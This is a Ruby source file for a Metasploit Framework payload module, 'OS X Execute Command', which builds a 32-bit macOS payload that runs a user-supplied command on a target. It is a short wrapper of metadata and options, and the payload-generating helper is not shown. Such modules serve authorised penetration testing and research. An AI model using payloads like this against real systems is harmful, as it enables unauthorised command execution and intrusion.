##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# Exec
# ----
#
# Executes an arbitrary command.
#
###
module MetasploitModule

  CachedSize = 24

  include Msf::Payload::Single
  include Msf::Payload::Bsd::X86
  include Msf::Payload::Osx

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'OS X Execute Command',
      'Description' => 'Execute an arbitrary command',
      'Author'      => [
        'snagg <snagg[at]openssl.it>',
        'argp <argp[at]census-labs.com>',
        'joev'
      ],
      'License'     => BSD_LICENSE,
      'Platform'    => 'osx',
      'Arch'        => ARCH_X86
    ))

    register_options([
      OptString.new('CMD',  [ true,  "The command string to execute" ]),
    ])
  end

  #
  # Dynamically builds the exec payload based on the user's options.
  #
  def generate_stage(opts={})
    bsd_x86_exec_payload
  end
end
